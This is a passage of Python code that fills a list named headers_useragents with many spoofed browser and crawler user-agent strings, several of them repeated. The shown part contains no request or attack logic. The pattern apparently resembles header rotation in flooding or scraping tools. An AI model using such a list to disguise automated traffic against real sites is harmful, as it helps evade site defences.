        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
    )
    headers_useragents.append(
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318"
        " Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10"
        " (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC"
        " 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16"
        " (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
    )
    headers_useragents.append(
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
    )
    headers_useragents.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221"
        " Firefox/3.5.7"
    )
    headers_useragents.append(
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107"
        " UP.Link/6.2.3.15.0"
    )
    headers_useragents.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser"
        " [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3"
        " (.NET CLR 2.0.50727)"
    )
    headers_useragents.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows"
        " NT 5.1;)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720"
        " Minimo/0.007"
    )
    headers_useragents.append(
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR"
        " 2.0.50727; .NET CLR 3.0.04506.30)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
    )
    headers_useragents.append("Googlebot/2.1 (http://www.googlebot.com/bot.html)")
    headers_useragents.append("Opera/9.20 (Windows NT 6.0; U; en)")
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205"
        " Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR"
        " 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)"
    )
    headers_useragents.append("Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML,"
        " like Gecko) Version/4.0 Safari/528.16"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0;"
        " http://help.yahoo.com/help/us/ysearch/slurp)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209"
        " Firefox/3.6.13"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR"
        " 1.1.4322; .NET CLR 2.0.50727)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)")
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401"
        " Firefox/4.0 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo"
        " Firefox/3.6.8"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809"
        " Fedora/3.6.7-1.fc14 Firefox/3.6.7"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Yahoo! Slurp;"
        " http://help.yahoo.com/help/us/ysearch/slurp)"
    )
    headers_useragents.append(
        "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc"
        " dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1;"
        " WOW64; Trident/5.0; FunWebProducts)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30;"
        " .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR"
        " 3.0.4506.2152; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR"
        " 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR"
        " 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
    )
    headers_useragents.append(
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318"
        " Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10"
        " (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC"
        " 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16"
        " (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
    )
    headers_useragents.append(
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
    )
    headers_useragents.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221"
        " Firefox/3.5.7"
    )
    headers_useragents.append(
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107"
        " UP.Link/6.2.3.15.0"
    )
    headers_useragents.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser"
        " [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3"
        " (.NET CLR 2.0.50727)"
    )
    headers_useragents.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows"
        " NT 5.1;)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720"
        " Minimo/0.007"
    )
    headers_useragents.append(
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
    )
    headers_useragents.append(
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318"
        " Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10"
        " (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC"
        " 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16"
        " (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
    )
    headers_useragents.append(
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
    )
    headers_useragents.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221"
        " Firefox/3.5.7"
    )
    headers_useragents.append(
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107"
        " UP.Link/6.2.3.15.0"
    )
    headers_useragents.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser"
        " [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3"
        " (.NET CLR 2.0.50727)"
    )
    headers_useragents.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows"
        " NT 5.1;)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720"
        " Minimo/0.007"
    )
    headers_useragents.append(
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html)"
        " Gecko/2008032620"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot"
        " www.idealobserver.com"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; Arachmo)")
    headers_useragents.append("Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)")
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Baiduspider/2.0;"
        " +http://www.baidu.com/search/spider.html)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Baiduspider/2.0;"
        " +http://www.baidu.com/search/spider.html)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible;"
        " +http://www.become.com/site_owners.html)"
    )
